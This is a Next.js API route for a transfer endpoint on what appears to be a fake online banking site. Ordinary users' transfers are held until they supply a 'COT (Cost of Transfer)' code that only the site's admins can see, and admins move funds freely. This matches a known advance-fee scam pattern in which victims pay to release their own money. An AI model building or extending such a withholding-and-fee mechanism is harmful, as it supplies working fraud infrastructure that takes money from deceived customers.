import { NextResponse } from "next/server"
import { auth } from "@/lib/auth"
import { prisma } from "@/lib/prisma"

function generateCot(): string {
  return Math.floor(100000 + Math.random() * 900000).toString()
}

export async function POST(req: Request) {
  try {
    const session = await auth()
    if (!session?.user?.id) {
      return NextResponse.json({ error: "Unauthorized" }, { status: 401 })
    }

    const { recipientUsername, assetType, amount, note, accountNumber, routingNumber, swiftCode, recipientBank, transferType, accountName, bankAddress, country } = await req.json()
  if (!assetType || !amount || amount <= 0) {
    return NextResponse.json({ error: "Asset type and valid amount required" }, { status: 400 })
  }
  if (!routingNumber) {
    return NextResponse.json({ error: "Routing number/IBAN is required" }, { status: 400 })
  }
  if (transferType === "international" && !swiftCode) {
    return NextResponse.json({ error: "SWIFT code is required for international transfers" }, { status: 400 })
  }

  const senderId = session.user.id
  const isAdmin = (session.user as any).role === "ADMIN"

  let recipientId: string | null = null
  if (recipientUsername) {
    const found = await prisma.user.findFirst({
      where: {
        OR: [
          { username: recipientUsername },
          { name: recipientUsername },
        ],
      },
    })
    if (found) recipientId = found.id
  }

  const holding = await prisma.holding.findUnique({
    where: { userId_assetType: { userId: senderId, assetType } },
  })
  if (!holding || holding.amount < amount) {
    return NextResponse.json({ error: "Insufficient balance" }, { status: 400 })
  }

  if (isAdmin) {
    // Admin — process immediately without COP
    const recipientHolding = recipientId
      ? await prisma.holding.findUnique({
          where: { userId_assetType: { userId: recipientId, assetType } },
        })
      : null

    const tx = await prisma.$transaction(async (tx) => {
      await tx.holding.update({
        where: { id: holding.id },
        data: { amount: { decrement: amount } },
      })
      if (recipientHolding) {
        await tx.holding.update({
          where: { id: recipientHolding.id },
          data: { amount: { increment: amount } },
        })
      } else if (recipientId) {
        await tx.holding.create({
          data: { userId: recipientId, assetType, amount },
        })
      }

      return tx.transaction.create({
        data: {
          userId: senderId,
          recipientId,
          type: "transfer",
          assetType,
          amount,
          fee: 0,
          status: "completed",
          note: note || null,
          accountNumber: accountNumber || null,
          routingNumber: routingNumber || null,
          swiftCode: swiftCode || null,
          recipientBank: recipientBank || null,
          transferType: transferType || "local",
          accountName: accountName || null,
          bankAddress: bankAddress || null,
          country: country || null,
        },
      })
    })

    const sender = await prisma.user.findUnique({ where: { id: senderId }, select: { name: true, username: true } })
    const admins = await prisma.user.findMany({ where: { role: "ADMIN" }, select: { id: true } })
    const txnName = sender?.name || sender?.username || "User"
    await prisma.notification.createMany({
      data: [
        {
          userId: senderId,
          title: "Transfer Completed",
          message: `${amount} ${assetType} sent successfully${recipientBank ? " to " + recipientBank : ""}.`,
        },
        ...admins.map(a => ({
          userId: a.id,
          title: "Transfer Completed",
          message: `${amount} ${assetType} sent by ${txnName}${recipientBank ? " to " + recipientBank : ""}.`,
        })),
      ],
    })

    return NextResponse.json({ transferId: tx.id, completed: true })
  }

  // Check if COT is required
  const cotConfig = await prisma.config.findUnique({ where: { key: "cot_required" } })
  const cotRequired = cotConfig?.value !== "false"

  if (!cotRequired) {
    // Process immediately
    const recipientHolding = recipientId
      ? await prisma.holding.findUnique({
          where: { userId_assetType: { userId: recipientId, assetType } },
        })
      : null

    const tx = await prisma.$transaction(async (tx) => {
      await tx.holding.update({
        where: { id: holding.id },
        data: { amount: { decrement: amount } },
      })
      if (recipientHolding) {
        await tx.holding.update({
          where: { id: recipientHolding.id },
          data: { amount: { increment: amount } },
        })
      } else if (recipientId) {
        await tx.holding.create({
          data: { userId: recipientId, assetType, amount },
        })
      }

      return tx.transaction.create({
        data: {
          userId: senderId, recipientId, type: "transfer",
          assetType, amount, fee: 0, status: "completed",
          note: note || null, accountNumber: accountNumber || null,
          routingNumber: routingNumber || null, swiftCode: swiftCode || null,
          recipientBank: recipientBank || null, transferType: transferType || "local",
          accountName: accountName || null, bankAddress: bankAddress || null,
          country: country || null,
        },
      })
    })

    const sender = await prisma.user.findUnique({ where: { id: senderId }, select: { name: true, username: true } })
    const admins = await prisma.user.findMany({ where: { role: "ADMIN" }, select: { id: true } })
    const txnName = sender?.name || sender?.username || "User"
    await prisma.notification.createMany({
      data: [
        { userId: senderId, title: "Transfer Completed", message: `${amount} ${assetType} sent successfully${recipientBank ? " to " + recipientBank : ""}.` },
        ...admins.map(a => ({ userId: a.id, title: "Transfer Completed", message: `${amount} ${assetType} sent by ${txnName}${recipientBank ? " to " + recipientBank : ""}.` })),
      ],
    })

    return NextResponse.json({ transferId: tx.id, completed: true })
  }

  const cot = generateCot()

  const tx = await prisma.transaction.create({
    data: {
      userId: senderId, recipientId, type: "transfer",
      assetType, amount, fee: 0, status: "pending_cot", cot,
      note: note || null, accountNumber: accountNumber || null,
      routingNumber: routingNumber || null, swiftCode: swiftCode || null,
      recipientBank: recipientBank || null, transferType: transferType || "local",
      accountName: accountName || null, bankAddress: bankAddress || null,
      country: country || null,
    },
  })

  const sender = await prisma.user.findUnique({ where: { id: senderId }, select: { name: true, username: true } })
  const admins = await prisma.user.findMany({ where: { role: "ADMIN" }, select: { id: true } })
  const txnName = sender?.name || sender?.username || "User"
  await prisma.notification.createMany({
    data: admins.map(a => ({
      userId: a.id,
      title: "Pending COT Confirmation",
      message: `${txnName} initiated a transfer of ${amount} ${assetType}. COT code: ${cot}`,
    })),
  })

  return NextResponse.json({ transferId: tx.id, cot, message: "Kindly provide the COT (Cost of Transfer) code required to complete this transaction." })
  } catch (e) {
    console.error("Transfer initiate error:", e)
    return NextResponse.json({ error: "Something went wrong" }, { status: 500 })
  }
}
